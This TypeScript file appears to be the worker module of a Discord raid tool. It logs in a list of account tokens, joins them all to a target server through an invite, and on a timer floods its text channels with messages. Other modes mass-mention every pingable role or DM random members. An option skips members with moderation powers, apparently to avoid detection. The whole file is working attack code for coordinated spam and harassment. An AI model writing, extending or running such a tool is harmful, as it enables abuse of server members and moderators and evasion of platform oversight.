import {Client, Guild, TextChannel, GuildChannel, Snowflake, Role, Permissions, GuildMember, DMChannel, Collection} from "discord.js";
import App, {AttackMode} from "./app";
import Utils from "./utils";

export default class Worker {
    private readonly app: App;

    private nodes: Client[];

    private guild?: Guild;
    private channelCache?: TextChannel[];
    private attackInterval?: NodeJS.Timeout;
    private nodeIterator: number;
    private msgIterator: number;

    public constructor(app: App) {
        this.app = app;
        this.nodes = [];
        this.nodeIterator = 0;
        this.msgIterator = 0;
    }

    public async loadNodes(): Promise<number> {
        this.nodes = [];

        let loaded: number = 0;

        // TODO: Check for successful node creation
        for (let i: number = 0; i < this.app.tokens.length; i++) {
            const node: Client | null = await this.createNode(this.app.tokens[i]);

            if (node !== null) {
                this.nodes.push(node);
                loaded++;
            }
        }

        return loaded;
    }

    public async prepare(): Promise<this> {
        let amount: number = this.app.options.PREPARE_NODE_AMOUNT === "all" ? this.app.tokens.length : this.app.options.PREPARE_NODE_AMOUNT;

        if (amount > this.nodes.length) {
            amount = this.nodes.length;
        }

        this.app.log(`Preparing ${amount} node(s) ...`);

        for (let i: number = 0; i < this.nodes.length; i++) {
            if (!this.nodes[i].guilds.has(this.app.options.TARGET_GUILD_ID)) {
                // TODO: Use join timeout
                this.app.log(`Joining @ ${this.nodes[i].user.tag}`);

                await Utils.join(this.app.options.TARGET_GUILD_INVITE_CODE, this.nodes[i].token).catch((error: Error) => {
                    if (error.message === "Request failed with status code 403") {
                        this.app.log(`Node may be locked ~> ${this.nodes[i].user.tag} (${this.nodes[i].user.id})`);
                        this.dropNode(this.nodes[i]);
                    }
                    else {
                        throw error;
                    }
                });
            }
        }

        if (this.nodes.length === 0) {
            await this.endPrematurely("No nodes could be prepared");
        }
        else if (!this.guild) {
            this.guild = this.nodes[0].guilds.get(this.app.options.TARGET_GUILD_ID) as Guild;
            this.populateChannelCache();
        }

        return this;
    }

    private dropNode(node: Client): boolean {
        const index: number = this.nodes.indexOf(node);

        if (index !== -1) {
            this.nodes.splice(index, 1);

            return true;
        }

        return false;
    }

    private async endPrematurely(msg: string): Promise<void> {
        this.app.log(`Ending prematurely: ${msg}`);
        await this.cleanup();
        process.exit(0);
    }

    private populateChannelCache(): this {
        if (!this.guild) {
            throw new Error("[Worker.populateChannelCache] Expecting guild");
        }

        this.channelCache = this.guild.channels.filter((channel: GuildChannel) => {
            const perms: Permissions | null = channel.permissionsFor(channel.guild.me);

            if (!perms) {
                return false;
            }

            return channel.type === "text" &&
                !this.app.options.TARGET_GUILD_CHANNELS_AVOID.includes(channel.id) &&
                perms.has("SEND_MESSAGES");
        }).array() as any;

        return this;
    }

    private getRandomChannel(node: Client): TextChannel | null {
        if (!this.channelCache) {
            this.populateChannelCache();

            if (!this.channelCache) {
                throw new Error("[Worker.getRandomChannel] Expecting channel cache to be populated");
            }
        }
        
        const target: Snowflake = this.channelCache[Utils.getRandomInt(0, this.channelCache.length)].id;

        if (!node.channels.has(target)) {
            this.nodes.splice(this.nodes.indexOf(node), 1);
            this.app.log(`Node Down ~> ${node.user.tag} (${node.user.id}) [${this.nodes.length} up]`);

            return null;
        }

        return node.channels.get(target) as TextChannel;
    }

    private getNextNode(): Client {
        this.nodeIterator++;

        if (this.nodeIterator >= this.nodes.length) {
            this.nodeIterator = 1;
        }

        return this.nodes[this.nodeIterator - 1];
    }

    // TODO: Channels are bound to specific nodes
    private async getRandomNodeRandomChannel(): Promise<TextChannel | null> {
        let result: TextChannel | null = null;

        while (result === null && this.nodes.length > 0) {
            result = this.getRandomChannel(this.getNextNode());
        }

        if (this.nodes.length === 0) {
            await this.cleanup();
            await this.endPrematurely("All nodes down");
        }

        return result;
    }

    // TODO: Determine if we can keep sending messages, etc.
    private canContinue(): boolean {
        return true;
    }

    private getGuildFor(node: Client): Guild | null {
        return node.guilds.has(this.app.options.TARGET_GUILD_ID) ? node.guilds.get(this.app.options.TARGET_GUILD_ID) as Guild : null;
    }

    private getNextMember(): GuildMember | null {
        const node: Client = this.getNextNode();
        const guild: Guild | null = this.getGuildFor(node);

        if (guild !== null) {
            let members: Collection<Snowflake, GuildMember> = guild.members.clone();

            if (this.app.options.MODE_AVOID_STAFF) {
                members = members.filter((member: GuildMember) => {
                    return member.id !== node.user.id && !Utils.hasModerationPowers(member);
                });
            }

            return members.random() || null;
        }

        return null;
    }

    public start(): Promise<number> {
        let sent: number = 0;

        if (!this.guild) {
            throw new Error("[Worker.start] Expecting guild and channel");
        }

        if (this.app.options.MODE === AttackMode.Random || this.app.options.MODE === AttackMode.RandomPings || this.app.options.MODE === AttackMode.DMs) {
            return new Promise((resolve) => {
                this.attackInterval = setInterval(async () => {
                    if (!this.canContinue()) {
                        await this.cleanup();
                        resolve(sent);

                        return;
                    }

                    await this.sendPayload();
                    sent += this.nodes.length;
                }, this.app.options.MESSAGES_SEND_INTERVAL);
            });
        }
        else {
            throw new Error("[Worker.start] An invalid mode was specified");
        }
    }

    private async sendPayload(): Promise<this> {
        let payload: string = "Payload!";

        // Determine payload
        if (this.app.options.MODE === AttackMode.Random || this.app.options.MODE === AttackMode.DMs) {
            payload = this.app.messages[this.msgIterator];
            this.msgIterator++;

            if (this.msgIterator >= this.app.messages.length) {
                this.msgIterator = 0;
            }
        }
        else if (this.app.options.MODE === AttackMode.RandomPings) {
            if (!this.guild) {
                throw new Error("[Worker.sendPayload] Expecting guild");
            }

            // TODO: Avoid admins and cycle roles, also inefficient to loop through them every time
            const mentionableRoles: Role[] = this.guild.roles.filter((role: Role) => role.mentionable).array();

            // TODO: Should be done in the first client's load
            if (mentionableRoles.length === 0) {
                await this.endPrematurely("[Worker.sendPayload] Target guild has no mentionable roles");
            }

            payload = mentionableRoles.map((role) => role.toString()).join(" ");
        }
        else {
            throw new Error(`[Worker.sendPayload] Mode invalid or not supported: ${this.app.options.MODE}`);
        }

        // DMs attack mode
        if (this.app.options.MODE === AttackMode.DMs) {
            const member: GuildMember | null = this.getNextMember();

            if (member !== null) {
                const dm: any = await member.createDM().catch((error: Error) => {
                    if (error.message !== "Cannot send messages to this user") {
                        throw error;
                    }
                });

                // TODO: Remember user to avoid trying to send messages again in this session
                if (dm) {
                    dm.send(payload);
                }
            }

            return this;
        }

        // Send payload
        for (let i: number = 0; i < this.nodes.length; i++) {
            const channel: TextChannel | null = await this.getRandomNodeRandomChannel();
            
            if (channel !== null) {
                channel.send(payload).catch((error: Error) => {
                    // TODO: Node down
                });
            }
            else {
                break;
            }
        }

        return this;
    }

    private async cleanup(): Promise<this> {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }

        this.nodeIterator = 0;
        this.msgIterator = 0;

        if (this.nodes.length > 0) {
            for (let i: number = 0; i < this.nodes.length; i++) {
                await this.nodes[i].destroy();
            }
        }

        this.nodes = [];

        return this;
    }

    // TODO: Catch login errors (invalid tokens)
    private async createNode(token: string): Promise<Client | null> {
        const node: Client = new Client();

        return new Promise<Client | null>((resolve) => {
            node.once("ready", () => {
                resolve(node);
            });

            node.login(token).catch((error: Error) => {
                if (error.message === "Incorrect login details were provided.") {
                    resolve(null);
                }
                else {
                    throw error;
                }
            });
        });
    }
}